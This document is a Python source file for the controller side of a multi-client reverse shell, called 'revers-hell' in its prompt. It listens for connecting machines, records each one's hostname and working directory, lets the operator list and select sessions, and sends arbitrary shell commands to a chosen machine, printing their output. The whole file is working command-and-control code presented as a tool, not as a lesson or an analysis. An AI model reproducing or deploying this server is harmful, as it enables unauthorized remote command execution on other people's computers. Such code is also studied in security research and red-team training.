import socket
import random
import time
import threading
from queue import Queue


class ReverServer:
    """
    This class is the reverse shell's server.
    It can handle multiple clients and modules
    """

    def __init__(self, port: int=None, host: str=None):
        """
        Init method

        :param port: The port the socket will be listening to
        :param host: The IP address of the host
        """
        # Checks if the vars are null
        if port is not None:
            self.port = port
        else:
            self.port = 8765
        if host is not None:
            self.host = host
        else:
            self.host = '127.0.0.1'

        # The list of clients connected to the server
        self.clients = []

        # Main queue
        self.queue = Queue()

        # List of Client IDs
        self.idlist = []

        # Currently selected Client ID
        self.selcid = -1
        # Socket
        try:
            self.s = socket.socket()
        except socket.error as err:
            print('[!} Socket creation failed: ' + str(err))

    def bind_socket(self):
        """
        Binds the socket to the predefined port.
        If it fails, it'll retry to bind it
        """
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(10)
        except socket.error as err:
            print('[!] Socket binding failed: ' + str(err))
            print('[!] Retrying...')
            self.bind_socket()

    def accept_connections(self):
        """
        Accepts new connections from clients
        """

        # Closes all connections
        for cli in self.clients:
            cli.s.close()

        # Clears list
        del self.clients[:]

        # Starts accepting new connections
        while True:
            try:
                # Creates a new client holder
                client = Client()

                # Accepts the connection
                conn, address = self.s.accept()
                conn.setblocking(1)

                # Gets the name and the current working dir
                client.name = conn.recv(4096).decode('utf-8')
                client.cwd = conn.recv(4096).decode('utf-8')

                # Generates an id for the client
                client.id = self.gen_id()

                # Sets the connection and address info of the client
                client.s = conn
                client.address = address

                # Prints out the connection info
                print('[*] New connection with {0}@{1}:{2}'.format(client.name, address[0], address[1]))
                # Adds the new client to the client list
                self.clients.append(client)
            except Exception as err:
                print('[!] Error while accepting connection: ' + str(err))

    def gen_id(self):
        """
        Generates an ID
        :return: An unused ID
        """
        cid = random.choice(range(1024))
        if cid not in self.idlist:
            self.idlist.append(cid)
        else:
            self.gen_id()
        return cid

    def start(self):
        while True:
            cmd = input('/revers-hell> ')
            args = cmd.split()

            # Checks if string is not empty
            if len(cmd) == 0:
                continue

            # TODO Make this elifs module based
            elif args[0] == 'list':
                conns = self.list_connections()
                print(conns)
            elif args[0] == 'select':
                if len(args) < 2:
                    continue
                if self.select_client(int(args[1])):
                    print('[*] Client {0} is now selected'.format(args[1]))
            elif args[0] == 'join':

                # Checks if client exists
                conn = self.get_client_connection(self.selcid)
                if conn is None:
                    print('[!] No connection linked to client {0} was found'.format(args[1]))
                    continue
                if self.join_client(self.selcid):
                    print('[*] Exited')
                else:
                    print('[!] Connection wasn\'t closed properly')

    def list_connections(self):
        """
        Lists all of the open connections at the moment
        :return: The complete connection list
        """
        # Header of the string
        res = '\nID\t\tNAME@IP:PORT\n\t\tC:\\CWD\\\n'
        for i, cli in enumerate(self.clients):
            try:
                cli.s.send(str.encode('ayylmao'))
                cli.s.recv(1024)
            except socket.error:
                del self.clients[i]
                continue
            res += '{0}\t\t{1}@{2}:{3}\n\t\t{4}\n'.format(cli.id, cli.name, cli.address[0], cli.address[1], cli.cwd)
        return res

    def get_client_connection(self, cid):
        """
        Gets the connection associated with cid
        :param cid: The Client ID
        :return: The connection if the specified ID exists, none otherwise
        """
        try:
            for cli in self.clients:
                if cli.id == int(cid):
                    return cli.s
        except:
            return None

    def select_client(self, cid):
        """
        Sets the currently selected client to the one specified with cid
        :param cid: The Client ID
        :return: True if the given ID is valid, False otherwise
        """
        try:
            if cid in self.idlist:
                self.selcid = cid
            return True
        except:
            return False

    def join_client(self, cid):
        """
        Joins the client session
        :param cid: The client id to be joined
        :return: True if session was closed correctly, false otherwise
        """

        # Gets the client
        client = None
        ind = None
        for i, cli in enumerate(self.clients):
            if cli.id == cid:
                client = cli
                ind = i
        if client is None:
            return False
        conn = client.s

        # Keep sending commands until connection is closed
        while True:
            try:
                cmd = input('\n{}> '.format(client.cwd))
                # Checks if input isn't blank
                if len(cmd) == 0:
                    continue
                if cmd == 'quit':
                    return True
                conn.send(str.encode('heylisten'))
                conn.recv(1024)
                time.sleep(0.1)
                conn.send(str.encode(cmd))
                resp = conn.recv(10240).decode('utf-8')
                client.cwd = conn.recv(10240).decode('utf-8')
                self.clients[ind] = client
                print(resp, end='')
            except:
                return False


class Client:
    """
    This class holds informations about a client
    """

    def __init__(self):
        # Name of the client (PC Name)
        self.name = ''

        # Address of the client (IP and port)
        self.address = ''

        # Current working directory
        self.cwd = ''

        # Client ID
        self.id = 0

        # Port
        self.port = 0

        # Connection socket
        self.s = socket.socket()

    def send(self, data: bytes):
        self.s.send(data)

server = ReverServer()


def create_workers():
    """
    Creates threads for handling the server
    """
    for _ in range(2):
        threading.Thread(target=work, daemon=True).start()


def work():
    """
    Starts and handles the work
    """
    while True:
        q = server.queue.get()
        if q == 1:
            server.bind_socket()
            server.accept_connections()
        if q == 2:
            server.start()
        server.queue.task_done()


def create_jobs():
    for x in range(1, 3):
        server.queue.put(x)
    server.queue.join()

create_workers()
create_jobs()
